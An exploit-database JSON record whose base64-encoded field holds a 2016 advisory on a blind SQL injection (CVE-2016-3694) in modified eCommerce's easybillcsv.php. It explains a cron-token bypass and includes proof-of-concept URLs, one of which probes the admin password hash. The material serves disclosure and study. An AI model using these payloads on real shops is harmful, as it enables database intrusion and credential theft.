{
    "source": "exploit-database", 
    "exploit": "IyBUaXRsZTogQmxpbmQgSW5qZWN0aW9uIG1vZGlmaWVkIGVDb21tZXJjZSAyLjAuMC4wIHJldiA5Njc4DQojIERhdGU6IDE2LjA0LjIwMTYNCiMgQ2F0ZWdvcnk6IHdlYmFwcHMNCiMgVmVuZG9yIEhvbWVwYWdlOiBodHRwOi8vd3d3Lm1vZGlmaWVkLXNob3Aub3JnL2Rvd25sb2FkDQojIFNvZnR3YXJlIExpbms6IGh0dHA6Ly93d3cubW9kaWZpZWQtc2hvcC5vcmcvZm9ydW0vaW5kZXgucGhwP2FjdGlvbj1kb3dubG9hZHM7c2E9ZG93bmZpbGUmaWQ9OTYNCiMgVmVyc2lvbjogMi4wLjAuMCByZXYgOTY3OA0KIyBUZXN0ZWQgb246IEFwYWNoZS8yLjQuNywgUEhQIFZlcnNpb24gNS41LjksIExpbnV4DQojIEV4cGxvaXQgQXV0aG9yOiBGZWxpeCBNYWR1YWtvcg0KIyBDb250YWN0OiBGZWxpeC5NYWR1YWtvckBydWIuZGUNCiMgQ1ZFOiBDVkUtMjAxNi0zNjk0DQoNClByb2R1Y3QgRGVzY3JpcHRpb246DQptb2RpZmllZCBlQ29tbWVyY2UgaXMgYW4gT3BlbiBTb3VyY2Ugc2hvcHNvZnR3YXJlDQoNClZ1bG5lcmFiaWxpdHkgRGV0YWlsczoNCkF0dGFja2FibGUgYXJlIHRoZSBHRVQtcGFyYW1ldGVycyAnb3JkZXJzX3N0YXR1cycgYW5kICdjdXN0b21lcnNfc3RhdHVzJyB0aHJvdWdoICdlYXN5YmlsbGNzdi5waHAnOg0KDQoNCkZpbGU6IFtzaG9wcm9vdF0vYXBpL2Vhc3liaWxsL2Vhc3liaWxsY3N2LnBocA0KDQpbMjRdIAkJaWYgKGlzc2V0KCRfR0VUWyd0b2tlbiddKSAmJiAgJF9HRVRbJ3Rva2VuJ10gPT0gTU9EVUxFX0VBU1lCSUxMX0NTVl9DUk9OX1RPS0VOKSB7DQpbMjUtNjFdIAkJLi4uDQpbNjJdCQkJfSBlbHNlIHsNCls2M10JCQkJCWRpZSgnRGlyZWN0IEFjY2VzcyB0byB0aGlzIGxvY2F0aW9uIGlzIG5vdCBhbGxvd2VkLicpOw0KDQpBcyBkZWZhdWx0IG9wdGlvbiB0aGUgZWFzeWJpbGwtbW9kdWxlIGlzIG5vdCBpbnN0YWxsZWQgYW5kIHRoZSBjb25zdGFudCBNT0RVTEVfRUFTWUJJTExfQ1NWX0NST05fVE9LRU4gaXMgbm90IHNldC4gQXMgbG9uZyBhcyB0aGUgZWFzeWJpbGwtbW9kdWxlIGlzIG5vdCBpbnN0YWxsZWQsIGl0IGlzIHBvc3NpYmxlIHRvIGJ5cGFzcyB0aGUgcmVzdHJpY3Rpb246IFtTaG9wcm9vdF0vYXBpL2Vhc3liaWxsL2Vhc3liaWxsY3N2LnBocD90b2tlbj1NT0RVTEVfRUFTWUJJTExfQ1NWX0NST05fVE9LRU4NCg0KDQpbMzVdCQkJaWYgKGNvdW50KCRfR0VUWydvcmRlcnNfc3RhdHVzJ10pID4gMCkgew0KWzM2XQkJCSRfR0VUWydvcmRlcnNfc3RhdHVzJ10gPSBwcmVnX3JlcGxhY2UoIidbXHJcblxzXSsnIiwgJycsICRfR0VUWydvcmRlcnNfc3RhdHVzJ10pOw0KWzM3XQkJCSRvcmRlcnNfc3RhdHVzID0gZXhwbG9kZSgnLCcsICRfR0VUWydvcmRlcnNfc3RhdHVzJ10pOw0KWzM4XQkJCSRtb2R1bGUtPmZyb21fb3JkZXJzX3N0YXR1cyA9IGltcGxvZGUoIicsICciLCAkb3JkZXJzX3N0YXR1cyk7DQpbMzldCQkJfQ0KDQoNCls0M10JCQlpZiAoaXNzZXQoJF9HRVRbJ2N1c3RvbWVyc19zdGF0dXMnXSkpIHsNCls0NF0JCQkkX0dFVFsnY3VzdG9tZXJzX3N0YXR1cyddID0gcHJlZ19yZXBsYWNlKCInW1xyXG5cc10rJyIsICcnLCAkX0dFVFsnY3VzdG9tZXJzX3N0YXR1cyddKTsNCls0NV0JCQkkY3VzdG9tZXJzX3N0YXR1cyA9IGV4cGxvZGUoJywnLCAkX0dFVFsnY3VzdG9tZXJzX3N0YXR1cyddKTsNCls0Nl0JCQkkbW9kdWxlLT5mcm9tX2N1c3RvbWVyc19zdGF0dXMgPSBpbXBsb2RlKCInLCAnIiwgJGN1c3RvbWVyc19zdGF0dXMpOw0KWzQ3XQkJCX0NCg0KQXMgeW91IGNhbiBzZWUgaW4gbGluZXMgMzUtMzkgYW5kIDQzLTQ3IHRoZSBHRVQtcGFyYW1ldGVycyAnb3JkZXJzX3N0YXR1cycgYW5kICdjdXN0b21lcnNfc3RhdHVzJyBhcmUgbm90IGVzY2FwZWQsIGJ1dCBmb3JtYXR0ZWQgKHJlbW92ZWQgd2hpdGVzcGFjZXMsIHJlcGxhY2VkIGNvbW1hcyB3aXRoICInLCAnIikuIFRoZXkgd2lsbCBiZSBzZXQgYXMgbG9jYWwgdmFyaWFibGVzIG9mIHRoZSAiJG1vZHVsZSItb2JqZWN0Lg0KDQpGaWxlOiBbc2hvcHJvb3RdW2FkbWluLWZvbGRlcl0vaW5jbHVkZXMvbW9kdWxlcy9zeXN0ZW0vZWFzeWJpbGxjc3YucGhwDQoNCls2M10JCSRleHBvcnRfcXVlcnkgPSB4dGNfZGJfcXVlcnkoIlNFTEVDVCBESVNUSU5DVCBvLm9yZGVyc19pZCANCls2NF0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUk9NICIuVEFCTEVfT1JERVJTLiIgbw0KWzY1XSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpPSU4gIi5UQUJMRV9PUkRFUlNfU1RBVFVTX0hJU1RPUlkuIiBvc2gNCls2Nl0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9OIG8ub3JkZXJzX2lkID0gb3NoLm9yZGVyc19pZAkNCls2N10gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdIRVJFIChvLm9yZGVyc19zdGF0dXMgSU4gKCciIC4gJHRoaXMtPmZyb21fb3JkZXJzX3N0YXR1cyAuICInKSANCls2OF0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBPUiBvc2gub3JkZXJzX3N0YXR1c19pZCBJTiAoJyIgLiAkdGhpcy0+ZnJvbV9vcmRlcnNfc3RhdHVzIC4gIicpKQ0KWzY5XSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBBTkQgKG8ubGFzdF9tb2RpZmllZCA+PSAnIi4gZGF0ZSggIlktbS1kIEg6aTpzIiwgc3RydG90aW1lKCR0aGlzLT5mcm9tX29yZGVyX2RhdGUpKSAuICInDQpbNzBdICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT1Igby5kYXRlX3B1cmNoYXNlZCA+PSAnIi4gZGF0ZSggIlktbS1kIEg6aTpzIiwgc3RydG90aW1lKCR0aGlzLT5mcm9tX29yZGVyX2RhdGUpKSAuICInKQ0KWzcxXSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBBTkQgby5jdXN0b21lcnNfc3RhdHVzIElOICgnIiAuICR0aGlzLT5mcm9tX2N1c3RvbWVyc19zdGF0dXMgLiAiJykNCls3Ml0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9SREVSIEJZIG8ub3JkZXJzX2lkIik7DQoNCg0KVGhlIHVuZXNjYXBlZCBHRVQtcGFyYW1ldGVycyBnZXQgcGxhY2VkIGluIHRoZSBxdWVyeSBvbiBsaW5lIDY3LCA2OCBhbmQgNzEuDQpUaHJvdWdoIHRoZSBPUkRFUiBCWSBzdGF0ZW1lbnQgKHdpdGggdGhlIGV4cGxpY2l0IHRhYmxlLXJlZmVyZW5jZXMpIGl0IGlzIG5vdCBwb3NzaWJsZSB0byB1c2UgYSB1bmlvbi1iYXNlZCBpbmplY3Rpb24uDQpUaGUgaW5qZWN0aW9uIGNhbm5vdCBpbmNsdWRlIHdoaXRlc3BhY2VzIG9yIGNvbW1hcy4NCg0KUE9DIFtQcm9vZiBvZiBDb25jZXB0XToNCg0KaHR0cDovLzEyNy4wLjAuMS9zaG9wL2FwaS9lYXN5YmlsbC9lYXN5YmlsbGNzdi5waHA/dG9rZW49TU9EVUxFX0VBU1lCSUxMX0NTVl9DUk9OX1RPS0VOJm9yZGVyc19zdGF0dXM9LTExMScpKW9yLXNsZWVwKDUpLyomY3VzdG9tZXJzX3N0YXR1cz0qLyUyMw0KV2lsbCByZXN1bHQgaW4gZm9sbG93aW5nIHF1ZXJ5IGFuZCBleGVjdXRlIHRoZSBzbGVlcC1mdW5jdGlvbiBmb3IgNSBzZWNvbmRzOg0KDQpTRUxFQ1QgRElTVElOQ1Qgby5vcmRlcnNfaWQgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZST00gIi5UQUJMRV9PUkRFUlMuIiBvDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKT0lOICIuVEFCTEVfT1JERVJTX1NUQVRVU19ISVNUT1JZLiIgb3NoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9OIG8ub3JkZXJzX2lkID0gb3NoLm9yZGVyc19pZAkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV0hFUkUgKG8ub3JkZXJzX3N0YXR1cyBJTiAoJy0xMTEnKSlvci1zbGVlcCg1KS8qIA0KICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9uZyBjb21tZW50DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKi8jY29tbWVudA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9SREVSIEJZIG8ub3JkZXJzX2lkDQoNClRoZXJlIGFyZSBtdWx0aXBsZSB3YXlzIHRvIGJ5cGFzcyB0aGUgd2hpdGVzcGFjZS9jb21tYS1maWx0ZXIuIEEgcG9zc2libGUgd2F5IHRvIGNoZWNrIGlmIHRoZSBmaXJzdCBjaGFyYWN0ZXIgb2YgdGhlIGFkbWluLWhhc2ggaXMgJyQnIHdvdWxkIGJlOg0KDQoNCmh0dHA6Ly8xMjcuMC4wLjEvc2hvcC9hcGkvZWFzeWJpbGwvZWFzeWJpbGxjc3YucGhwP3Rva2VuPU1PRFVMRV9FQVNZQklMTF9DU1ZfQ1JPTl9UT0tFTiZvcmRlcnNfc3RhdHVzPS0xMTEnKSlvcihTZWxlY3QoY2FzZSgzNil3aGVuKGFzY2lpKHN1YnN0cmluZyhgY3VzdG9tZXJzX3Bhc3N3b3JkYEZST00oMSlGT1IoMSkpKSl0aGVuLXNsZWVwKDUpRW5kKWZyb21gY3VzdG9tZXJzYHdoZXJlYGN1c3RvbWVyc19pZGA9MSkvKiZjdXN0b21lcnNfc3RhdHVzPSovJTIzDQoNCg0KDQoNClRpbWVsaW5lDQotLS0tLQ0KWzE2LjA0LjIwMTZdIFJlcG9ydGluZyB2dWxuZXJhYmlsaXR5IHRvIHZlbmRvcg==", 
    "filename": "platforms/php/webapps/39710.txt", 
    "id": "39710", 
    "cves": [
        "CVE-2016-3694"
    ]
}